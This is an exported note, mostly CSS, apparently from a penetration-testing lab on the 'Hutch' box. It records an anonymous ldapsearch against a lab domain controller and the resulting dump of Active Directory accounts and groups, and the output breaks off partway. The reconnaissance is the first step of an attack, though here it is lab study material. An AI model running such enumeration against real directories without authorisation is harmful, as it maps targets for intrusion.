@@ -1,0 +1,2611 @@
+
+				
+				<html>
+					<head>
+						<meta charset="UTF-8"/>
+						<meta name="viewport" content="width=device-width, initial-scale=1"/>
+						<style>pre code.hljs {
+  display: block;
+  overflow-x: auto;
+  padding: 1em;
+}
+
+code.hljs {
+  padding: 3px 5px;
+}
+
+/*
+
+Atom One Light by Daniel Gamage
+Original One Light Syntax theme from https://github.com/atom/one-light-syntax
+
+base:    #fafafa
+mono-1:  #383a42
+mono-2:  #686b77
+mono-3:  #a0a1a7
+hue-1:   #0184bb
+hue-2:   #4078f2
+hue-3:   #a626a4
+hue-4:   #50a14f
+hue-5:   #e45649
+hue-5-2: #c91243
+hue-6:   #986801
+hue-6-2: #c18401
+
+*/
+
+.hljs {
+  color: #383a42;
+  background: #fafafa;
+}
+
+.hljs-comment,
+.hljs-quote {
+  color: #a0a1a7;
+  font-style: italic;
+}
+
+.hljs-doctag,
+.hljs-keyword,
+.hljs-formula {
+  color: #a626a4;
+}
+
+.hljs-section,
+.hljs-name,
+.hljs-selector-tag,
+.hljs-deletion,
+.hljs-subst {
+  color: #e45649;
+}
+
+.hljs-literal {
+  color: #0184bb;
+}
+
+.hljs-string,
+.hljs-regexp,
+.hljs-addition,
+.hljs-attribute,
+.hljs-meta .hljs-string {
+  color: #50a14f;
+}
+
+.hljs-attr,
+.hljs-variable,
+.hljs-template-variable,
+.hljs-type,
+.hljs-selector-class,
+.hljs-selector-attr,
+.hljs-selector-pseudo,
+.hljs-number {
+  color: #986801;
+}
+
+.hljs-symbol,
+.hljs-bullet,
+.hljs-link,
+.hljs-meta,
+.hljs-selector-id,
+.hljs-title {
+  color: #4078f2;
+}
+
+.hljs-built_in,
+.hljs-title.class_,
+.hljs-class .hljs-title {
+  color: #c18401;
+}
+
+.hljs-emphasis {
+  font-style: italic;
+}
+
+.hljs-strong {
+  font-weight: bold;
+}
+
+.hljs-link {
+  text-decoration: underline;
+}</style>
+						<title>Hutch</title>
+					</head>
+					<body>
+						<div class="exported-note"><div class="exported-note-title">Hutch</div>
+
+<style>
+		/* https://necolas.github.io/normalize.css/ */
+		html{line-height:1.15;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}
+		article,aside,footer,header,nav,section{display:block}h1{font-size:2em;margin:.67em 0}hr{box-sizing:content-box;height:0;overflow:visible}
+		pre{font-family:monospace,monospace;font-size:1em}a{background-color:transparent;-webkit-text-decoration-skip:objects}
+		b,strong{font-weight:bolder}small{font-size:80%}img{border-style:none}
+
+		body {
+			font-size: 15px;
+			color: #32373F;
+			word-wrap: break-word;
+			line-height: 1.6em;
+			background-color: #ffffff;
+			font-family: 'Avenir Next', 'Avenir', 'Arial', sans-serif;
+			padding-bottom: 0px;
+			padding-top: 0px;
+		}
+		kbd {
+			border: 1px solid rgb(220, 220, 220);
+			box-shadow: inset 0 -1px 0 rgb(220, 220, 220);
+			padding: 2px 4px;
+			border-radius: 3px;
+			background-color: rgb(243, 243, 243);
+		}
+
+		:root {
+			--scrollbar-size: 7px;
+		}
+
+		::-webkit-scrollbar {
+			width: var(--scrollbar-size);
+			height: var(--scrollbar-size);
+		}
+		::-webkit-scrollbar-thumb {
+			border-radius: calc(var(--scrollbar-size) / 2);
+		}
+		::-webkit-scrollbar-corner {
+			background: none;
+		}
+		::-webkit-scrollbar-track {
+			border: none;
+		}
+		::-webkit-scrollbar-thumb {
+			background: rgba(50, 55, 63, 0.54); 
+		}
+		::-webkit-scrollbar-track:hover {
+			background: rgba(0, 0, 0, 0.1); 
+		}
+		::-webkit-scrollbar-thumb:hover {
+			background: rgba(50, 55, 63, 0.63); 
+		}
+
+		
+
+		/* Remove top padding and margin from first child so that top of rendered text is aligned to top of text editor text */
+
+		#rendered-md > h1:first-child,
+		#rendered-md > h2:first-child,
+		#rendered-md > h3:first-child,
+		#rendered-md > h4:first-child,
+		#rendered-md > ul:first-child,
+		#rendered-md > ol:first-child,
+		#rendered-md > table:first-child,
+		#rendered-md > blockquote:first-child,
+		#rendered-md > img:first-child,
+		#rendered-md > p:first-child {
+			margin-top: 0;
+			padding-top: 0;
+		}
+		
+		p, h1, h2, h3, h4, h5, h6, ul, table {
+			margin-top: .6em;
+			margin-bottom: 1.35em;
+
+			/*
+				Adds support for RTL text in the note body. It automatically detects the direction using the content.
+				Issue: https://github.com/laurent22/joplin/issues/3991
+			*/
+			unicode-bidi: plaintext;
+		}
+
+		h1, h2, h3, h4, h5, h6, ul, table {
+			margin-bottom: 0.65em;
+		}
+
+		h1, h2, h3, h4, h5, h6 {
+			line-height: 1.5em;
+		}
+		h1 {
+			font-size: 1.5em;
+			font-weight: bold;
+			border-bottom: 1px solid #dddddd;
+			padding-bottom: .3em;
+		}
+		h2 {
+			font-size: 1.3em;
+			font-weight: bold;
+			padding-bottom: .1em; */
+		}
+		h3 {
+			font-size: 1.1em;
+			font-weight: bold;
+		}
+		h4, h5, h6 {
+			font-size: 1em;
+			font-weight: bold;
+		}
+
+		.exported-note-title {
+			font-size: 2em;
+			font-weight: bold;
+			margin-bottom: 0.8em;
+			line-height: 1.5em;
+			padding-bottom: .35em;
+			border-bottom: 1px solid #dddddd;
+		}
+
+		a {
+			color: #155BDA;
+		}
+		ul, ol {
+			padding-left: 0;
+			margin-left: 1.7em;
+		}
+		li {
+			margin-bottom: .4em;
+		}
+		li p {
+			margin-top: 0.2em;
+			margin-bottom: 0;
+		}
+
+		dt {
+			font-weight: bold;
+			margin-bottom: 0.25em;
+		}
+
+		dd {
+			margin-inline-start: 2.5em;
+			margin-bottom: 0.5em;
+		}
+
+		.resource-icon {
+			display: inline-block;
+			position: relative;
+			top: 0.3em;
+			text-decoration: none;
+			width: 1.2em;
+			height: 1.4em;
+			margin-right: 0.4em;
+			background-color:  #155BDA;
+		}
+    /* These icons are obtained from the wonderful ForkAwesome project by copying the src svgs 
+     * into the css classes below.
+     * svgs are obtained from https://github.com/ForkAwesome/Fork-Awesome/tree/master/src/icons/svg
+     * instead of the svg width, height property you must use a viewbox here, 0 0 1536 1792 is typically the actual size of the icon
+     * each line begins with the pre-amble -webkit-mask: url("data:image/svg+xml;utf8,
+     * and of course finishes with ");
+     * to prevent artifacts it is also necessary to include -webkit-mask-repeat: no-repeat;
+     * on the following line
+     * */
+		.fa-joplin {
+			/* Awesome Font file */
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M373.834 128C168.227 128 0 296.223 0 501.834v788.336C0 1495.778 168.227 1664 373.834 1664h788.336c205.608 0 373.83-168.222 373.83-373.83V501.834C1536 296.224 1367.778 128 1162.17 128zm397.222 205.431h417.424a7.132 7.132 0 0 1 7.132 7.133v132.552c0 4.461-3.619 8.073-8.077 8.073h-57.23c-24.168 0-43.768 19.338-44.284 43.374v2.377h-.017v136.191h-.053l-.466 509.375c-5.02 77.667-39.222 149.056-96.324 201.046-60.28 54.834-141.948 85.017-229.962 85.017-12.45 0-25.208-.61-37.907-1.785-92.157-8.682-181.494-48.601-251.662-112.438-71.99-65.517-117.147-150.03-127.164-238-11.226-98.763 23.42-192.783 95.045-257.937 81.99-74.637 198.185-101.768 316.613-75.704 5.574 1.227 9.55 6.282 9.55 11.997v199.52c-.199 2.625-1.481 6.599-8.183 2.896-.663-.365-1.194-.511-1.653-.531-21.987-10.587-45.159-17.57-68.559-19.916-.38-.04-.757-.124-1.138-.163-.537-.048-1.034-.033-1.556-.075-4.13-.354-8.183-.517-12.203-.58-.87-.011-1.771-.127-2.641-.127-.486 0-.951.05-1.437.057-1.464.011-2.886.115-4.33.163-2.76.102-5.497.211-8.182.448-.273.024-.547.07-.835.097-25.509 2.4-47.864 11.104-65.012 25.47-.954.802-1.974 1.53-2.9 2.36a1.34 1.34 0 0 1-.168.146c-23.96 21.8-34.881 53.872-30.726 90.316 4.62 40.737 26.94 81.156 62.841 113.823 35.908 32.67 80.335 52.977 125.113 57.186 35.118 3.36 66.547-3.919 89.899-20.461a97.255 97.255 0 0 0 9.365-7.501c2.925-2.661 5.569-5.5 8.086-8.416.3-.348.672-.673.975-1.024 8.253-9.864 14.222-21.067 17.996-33.148.639-2.034 1.051-4.148 1.564-6.227.381-1.563.81-3.106 1.112-4.693.555-2.784.923-5.632 1.253-8.49.086-.709.183-1.414.237-2.128.492-4.893.693-9.858.55-14.91h.013V521.623c-2.01-22.626-20.78-40.434-43.928-40.434h-57.23a8.071 8.071 0 0 1-8.077-8.073V340.564a7.132 7.132 0 0 1 7.136-7.133z'/></svg>");
+		}
+		.fa-file-image {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zm-128-448v320H256v-192l192-192 128 128 384-384zm-832-192c-106 0-192-86-192-192s86-192 192-192 192 86 192 192-86 192-192 192z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-pdf {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zm-514-593c25 20 53 38 84 56 42-5 81-7 117-7 67 0 152 8 177 49 7 10 13 28 2 52-1 1-2 3-3 4v1c-3 18-18 38-71 38-64 0-161-29-245-73-139 15-285 46-392 83-103 176-182 262-242 262-10 0-19-2-28-7l-24-12c-3-1-4-3-6-5-5-5-9-16-6-36 10-46 64-123 188-188 8-5 18-2 23 6 1 1 2 3 2 4 31-51 67-116 107-197 45-90 80-178 104-262-32-109-42-221-24-287 7-25 22-40 42-40h22c15 0 27 5 35 15 12 14 15 36 9 68-1 3-2 6-4 8 1 3 1 5 1 8v30c-1 63-2 123-14 192 35 105 87 190 146 238zm-576 411c30-14 73-57 137-158-75 58-122 124-137 158zm398-920c-10 28-10 76-2 132 3-16 5-31 7-44 2-17 5-31 7-43 1-3 2-5 4-8-1-1-1-3-2-5-1-18-7-29-13-36 0 2-1 3-1 4zm-124 661c88-35 186-63 284-81-10-8-20-15-29-23-49-43-93-103-127-176-19 61-47 126-83 197-15 28-30 56-45 83zm646-16c-5-5-31-24-140-24 49 18 94 28 124 28 9 0 14 0 18-1 0-1-1-2-2-3z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-word {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM233 768v107h70l164 661h159l128-485c5-15 8-30 10-46 1-8 2-16 2-24h4l3 24c3 14 4 30 9 46l128 485h159l164-661h70V768h-300v107h90l-99 438c-4 16-6 33-7 46l-2 21h-4c0-6-2-14-3-21-3-13-5-30-9-46L825 768H711l-144 545c-4 16-5 33-8 46l-4 21h-4l-2-21c-1-13-3-30-7-46l-99-438h90V768H233z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-powerpoint {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zm-992-234v106h327v-106h-93v-167h137c43 0 82-2 118-15 90-31 146-124 146-233s-54-193-137-228c-38-15-84-19-130-19H416v107h92v555h-92zm353-280H650V882h120c35 0 62 6 83 18 36 21 56 62 56 115 0 56-20 99-62 120-21 10-47 15-78 15z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-excel {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zm-979-234v106h281v-106h-75l103-161c12-19 18-34 21-34h2c1 4 3 7 5 10 4 8 10 14 17 24l107 161h-76v106h291v-106h-68l-192-273 195-282h67V768H828v107h74l-103 159c-12 19-21 34-21 33h-2c-1-4-3-7-5-10-4-7-9-14-17-23L648 875h76V768H434v107h68l189 272-194 283h-68z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-audio {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM620 850c12 5 20 17 20 30v544c0 13-8 25-20 30-4 1-8 2-12 2-8 0-16-3-23-9l-166-167H288c-18 0-32-14-32-32v-192c0-18 14-32 32-32h131l166-167c10-9 23-12 35-7zm417 689c19 0 37-8 50-24 83-102 129-231 129-363s-46-261-129-363c-22-28-63-32-90-10-28 23-32 63-9 91 65 80 100 178 100 282s-35 202-100 282c-23 28-19 68 9 90 12 10 26 15 40 15zm-211-148c17 0 34-7 47-20 56-60 87-137 87-219s-31-159-87-219c-24-26-65-27-91-3-25 24-27 65-2 91 33 36 52 82 52 131s-19 95-52 131c-25 26-23 67 2 91 13 11 29 17 44 17z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-video {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM768 768c70 0 128 58 128 128v384c0 70-58 128-128 128H384c-70 0-128-58-128-128V896c0-70 58-128 128-128h384zm492 2c12 5 20 17 20 30v576c0 13-8 25-20 30-4 1-8 2-12 2-8 0-17-3-23-9l-265-266v-90l265-266c6-6 15-9 23-9 4 0 8 1 12 2z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-archive {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M640 384V256H512v128h128zm128 128V384H640v128h128zM640 640V512H512v128h128zm128 128V640H640v128h128zm700-388c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H768v128H640V128H128v1536h1280zM781 943c85 287 107 349 107 349 5 17 8 34 8 52 0 111-108 192-256 192s-256-81-256-192c0-18 3-35 8-52 0 0 21-62 120-396V768h128v128h79c29 0 54 19 62 47zm-141 465c71 0 128-29 128-64s-57-64-128-64-128 29-128 64 57 64 128 64z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-code {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM480 768c11-14 31-17 45-6l51 38c14 11 17 31 6 45l-182 243 182 243c11 14 8 34-6 45l-51 38c-14 11-34 8-45-6l-226-301c-8-11-8-27 0-38zm802 301c8 11 8 27 0 38l-226 301c-11 14-31 17-45 6l-51-38c-14-11-17-31-6-45l182-243-182-243c-11-14-8-34 6-45l51-38c14-11 34-8 45 6zm-620 461c-18-3-29-20-26-37l138-831c3-18 20-29 37-26l63 10c18 3 29 20 26 37l-138 831c-3 18-20 29-37 26z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-alt, .fa-file-csv {
+      /* fork-awesome doesn't have csv so we use the text icon */
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM384 800c0-18 14-32 32-32h704c18 0 32 14 32 32v64c0 18-14 32-32 32H416c-18 0-32-14-32-32v-64zm736 224c18 0 32 14 32 32v64c0 18-14 32-32 32H416c-18 0-32-14-32-32v-64c0-18 14-32 32-32h704zm0 256c18 0 32 14 32 32v64c0 18-14 32-32 32H416c-18 0-32-14-32-32v-64c0-18 14-32 32-32h704z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		blockquote {
+			border-left: 4px solid rgb(220, 220, 220);
+			padding-left: 1.2em;
+			margin-left: 0;
+			opacity: 0.7;
+		}
+
+		.jop-tinymce table,
+		table {
+			text-align: left;
+			border-collapse: collapse;
+			border: 1px solid rgb(220, 220, 220);
+			background-color: #ffffff;
+		}
+
+		.jop-tinymce table td, .jop-tinymce table th,
+		table td, th {
+			text-align: left;
+			padding: .5em 1em .5em 1em;
+			font-size: 15;
+			color: #32373F;
+			font-family: 'Avenir Next', 'Avenir', 'Arial', sans-serif;
+		}
+
+		.jop-tinymce table td,
+		table td {
+			border: 1px solid rgb(220, 220, 220);
+		}
+
+		.jop-tinymce table th,
+		table th {
+			border: 1px solid rgb(220, 220, 220);
+			border-bottom: 2px solid rgb(220, 220, 220);
+			background-color: rgb(247, 247, 247);
+		}
+
+		.jop-tinymce table tr:nth-child(even),
+		table:has(thead) tr:nth-child(even) {
+			background-color: rgb(247, 247, 247);
+		}
+
+		.jop-tinymce table tr:hover,
+		table tr:hover {
+			background-color: #e5e5e5;
+		}
+
+		hr {
+			border: none;
+			border-bottom: 2px solid #dddddd;
+		}
+		img {
+			max-width: 100%;
+			height: auto;
+		}
+		
+		.inline-code,
+		.mce-content-body code {
+			border: 1px solid rgb(220, 220, 220);
+			background-color: rgb(243, 243, 243);
+			padding-right: .2em;
+			padding-left: .2em;
+			border-radius: .25em;
+			color: rgb(0,0,0);
+			font-size: .9em;
+		}
+
+		.highlighted-keyword {
+			background-color: #F3B717;
+			color: black;
+		}
+
+		
+	.not-loaded-resource img {
+		width: 1.15em;
+		height: 1.15em;
+		background: white;
+		padding: 2px !important;
+		border-radius: 2px;
+		box-shadow: 0 1px 3px #000000aa;
+	}
+
+	a.not-loaded-resource img {
+		margin-right: .2em;
+	}
+
+	a.not-loaded-resource {
+		display: flex;
+		flex-direction: row;
+		align-items: center;
+	}
+
+
+		.md-checkbox input[type=checkbox]:checked {
+			opacity: 0.7;
+		}
+
+		.jop-tinymce ul.joplin-checklist .checked,
+		.md-checkbox .checkbox-label-checked {
+			opacity: 0.5;
+		}
+
+		.exported-note {
+			padding: 1em;
+		}
+
+		.joplin-editable .joplin-source {
+			display: none;
+		}
+
+		mark {
+			background: #F7D26E;
+			color: black;
+		}
+
+		/* =============================================== */
+		/* For TinyMCE */
+		/* =============================================== */
+
+		.mce-content-body {
+			/* Note: we give a bit more padding at the bottom, to allow scrolling past the end of the document */
+			padding: 5px 10px 10em 0;
+		}
+
+		/*
+		.mce-content-body code {
+			background-color: transparent;
+		}
+		*/
+
+		.mce-content-body [data-mce-selected=inline-boundary] {
+			background-color: transparent;
+		}
+
+		.mce-content-body .joplin-editable {
+			cursor: pointer !important;
+		}
+
+		.mce-content-body.mce-content-readonly {
+			opacity: 0.5;
+		}
+
+		/* We need that to make sure click events have the A has a target */
+		.katex a span {
+			pointer-events: none;
+		}
+
+		.media-player {
+			width: 100%;
+			margin-top: 10px;
+		}
+
+		.media-player.media-pdf {
+			min-height: 35rem;
+			width: 100%;
+			max-width: 1000px;
+			margin: 0;
+			border: 0;
+			display: block;
+		}
+
+		/* Clear the CODE style if the element is within a joplin-editable block */
+		.mce-content-body .joplin-editable code {
+			border: none;
+			background: none;
+			padding: 0;
+			color: inherit;
+			font-size: inherit;
+		}
+
+		/* To make code blocks horizontally scrollable */
+		/* https://github.com/laurent22/joplin/issues/5740 */
+		pre.hljs {
+			overflow-x: auto;
+		}
+
+		.joplin-table-wrapper{
+			overflow-x: auto;
+			overflow-y: hidden;
+		}
+
+		/* =============================================== */
+		/* For TinyMCE */
+		/* =============================================== */
+
+		@media print {
+			body {
+				height: auto !important;
+			}
+
+			pre {
+				white-space: pre-wrap;
+			}
+
+			.code, .inline-code {
+				border: 1px solid #CBCBCB;
+			}
+
+			#joplin-container-content {
+				/* The height of the content is set dynamically by JavaScript (in updateBodyHeight) to go
+				   around various issues related to scrolling. However when printing we don't want this
+				   fixed size as that would crop the content. So we set it to auto here. "important" is
+				   needed to override the style set by JavaScript at the element-level. */
+				height: auto !important;
+			}
+		}
+	
+
+				/*
+					FOR THE MARKDOWN EDITOR
+				*/
+
+				/* Remove the indentation from the checkboxes at the root of the document
+				   (otherwise they are too far right), but keep it for their children to allow
+				   nested lists. Make sure this value matches the UL margin. */
+
+				li.md-checkbox {
+					list-style-type: none;
+				}
+
+				li.md-checkbox input[type=checkbox] {
+					margin-left: -1.71em;
+					margin-right: 0.7em;
+					position: relative;
+					top: 1px;
+				}
+				
+				ul.joplin-checklist {
+					list-style:none;
+				}
+
+				/*
+					FOR THE RICH TEXT EDITOR
+				*/
+
+				ul.joplin-checklist li::before {
+					content:"\f14a";
+					font-family:"Font Awesome 5 Free";
+					background-size: 16px 16px;
+					pointer-events: all;
+					cursor: pointer;
+					width: 1em;
+					height: 1em;
+					margin-left: -1.3em;
+					position: absolute;
+					color: #32373F;
+				}
+
+				.joplin-checklist li:not(.checked)::before {
+					content:"\f0c8";
+				}
+
+				.abc-notation-block svg {
+					background-color: white;
+				}
+			
+.mermaid { width: 640px; }
+pre.mermaid[data-processed=true] { white-space: unset; }
+.mermaid-export-graph {
+					opacity: 0;
+					height: 0;
+					z-index: 1;
+					position: relative;
+				} 
+				.joplin-editable:hover .mermaid-export-graph,
+				.joplin-editable .mermaid-export-graph:has(:focus-visible) {
+					opacity: 1;
+				}
+				.mermaid-export-graph > button:hover {
+					background-color: #CBDAF1 !important;
+				}</style><div id="rendered-md"><h2 id="hutch">Hutch</h2>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Hutch]
+&boxur;&boxh;$ ldapsearch -H ldap://192.168.131.122 -x -W -b &quot;dc=hutch,dc=offsec&quot;
+Enter LDAP Password: 
+# extended LDIF
+#
+# LDAPv3
+# base &lt;dc=hutch,dc=offsec&gt; with scope subtree
+# filter: (objectclass=*)
+# requesting: ALL
+#
+
+# hutch.offsec
+dn: DC=hutch,DC=offsec
+
+# Administrator, Users, hutch.offsec
+dn: CN=Administrator,CN=Users,DC=hutch,DC=offsec
+
+# Guest, Users, hutch.offsec
+dn: CN=Guest,CN=Users,DC=hutch,DC=offsec
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: Guest
+description: Built-in account for guest access to the computer/domain
+distinguishedName: CN=Guest,CN=Users,DC=hutch,DC=offsec
+instanceType: 4
+whenCreated: 20201104052540.0Z
+whenChanged: 20201104052540.0Z
+uSNCreated: 8197
+memberOf: CN=Guests,CN=Builtin,DC=hutch,DC=offsec
+uSNChanged: 8197
+name: Guest
+objectGUID:: VKtEAAOQ8ki8PKRBs7xH+A==
+userAccountControl: 66082
+badPwdCount: 0
+codePage: 0
+countryCode: 0
+badPasswordTime: 0
+lastLogoff: 0
+lastLogon: 0
+pwdLastSet: 0
+primaryGroupID: 514
+objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGn9QEAAA==
+accountExpires: 9223372036854775807
+logonCount: 0
+sAMAccountName: Guest
+sAMAccountType: 805306368
+objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
+isCriticalSystemObject: TRUE
+dSCorePropagationData: 20201104053513.0Z
+dSCorePropagationData: 20201104052623.0Z
+dSCorePropagationData: 16010101000417.0Z
+
+# krbtgt, Users, hutch.offsec
+dn: CN=krbtgt,CN=Users,DC=hutch,DC=offsec
+
+# Domain Computers, Users, hutch.offsec
+dn: CN=Domain Computers,CN=Users,DC=hutch,DC=offsec
+objectClass: top
+objectClass: group
+cn: Domain Computers
+description: All workstations and servers joined to the domain
+distinguishedName: CN=Domain Computers,CN=Users,DC=hutch,DC=offsec
+instanceType: 4
+whenCreated: 20201104052623.0Z
+whenChanged: 20201104052623.0Z
+uSNCreated: 12330
+uSNChanged: 12332
+name: Domain Computers
+objectGUID:: SuBXv87h/Uq0hS9itdhc7g==
+objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnAwIAAA==
+sAMAccountName: Domain Computers
+sAMAccountType: 268435456
+groupType: -2147483646
+objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
+isCriticalSystemObject: TRUE
+dSCorePropagationData: 20201104053513.0Z
+dSCorePropagationData: 20201104052623.0Z
+dSCorePropagationData: 16010101000417.0Z
+
+# Domain Controllers, Users, hutch.offsec
+dn: CN=Domain Controllers,CN=Users,DC=hutch,DC=offsec
+
+# Schema Admins, Users, hutch.offsec
+dn: CN=Schema Admins,CN=Users,DC=hutch,DC=offsec
+
+# Enterprise Admins, Users, hutch.offsec
+dn: CN=Enterprise Admins,CN=Users,DC=hutch,DC=offsec
+
+# Cert Publishers, Users, hutch.offsec
+dn: CN=Cert Publishers,CN=Users,DC=hutch,DC=offsec
+objectClass: top
+objectClass: group
+cn: Cert Publishers
+description: Members of this group are permitted to publish certificates to th
+ e directory
+distinguishedName: CN=Cert Publishers,CN=Users,DC=hutch,DC=offsec
+instanceType: 4
+whenCreated: 20201104052623.0Z
+whenChanged: 20201104052623.0Z
+uSNCreated: 12342
+memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=hutch,DC=offse
+ c
+uSNChanged: 12344
+name: Cert Publishers
+objectGUID:: 6pR13+h/v0CBSMnRpjymjA==
+objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnBQIAAA==
+sAMAccountName: Cert Publishers
+sAMAccountType: 536870912
+groupType: -2147483644
+objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
+isCriticalSystemObject: TRUE
+dSCorePropagationData: 20201104053513.0Z
+dSCorePropagationData: 20201104052623.0Z
+dSCorePropagationData: 16010101000417.0Z
+
+# Domain Admins, Users, hutch.offsec
+dn: CN=Domain Admins,CN=Users,DC=hutch,DC=offsec
+
+# Domain Users, Users, hutch.offsec
+dn: CN=Domain Users,CN=Users,DC=hutch,DC=offsec
+objectClass: top
+objectClass: group
+cn: Domain Users
+description: All domain users
+distinguishedName: CN=Domain Users,CN=Users,DC=hutch,DC=offsec
+instanceType: 4
+whenCreated: 20201104052623.0Z
+whenChanged: 20201104052623.0Z
+uSNCreated: 12348
+memberOf: CN=Users,CN=Builtin,DC=hutch,DC=offsec
+uSNChanged: 12350
+name: Domain Users
+objectGUID:: 0zyAAvzt1UOKBKbf0N6FQQ==
+objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnAQIAAA==
+sAMAccountName: Domain Users
+sAMAccountType: 268435456
+groupType: -2147483646
+objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
+isCriticalSystemObject: TRUE
+dSCorePropagationData: 20201104053513.0Z
+dSCorePropagationData: 20201104052623.0Z
+dSCorePropagationData: 16010101000417.0Z
+
+# Domain Guests, Users, hutch.offsec
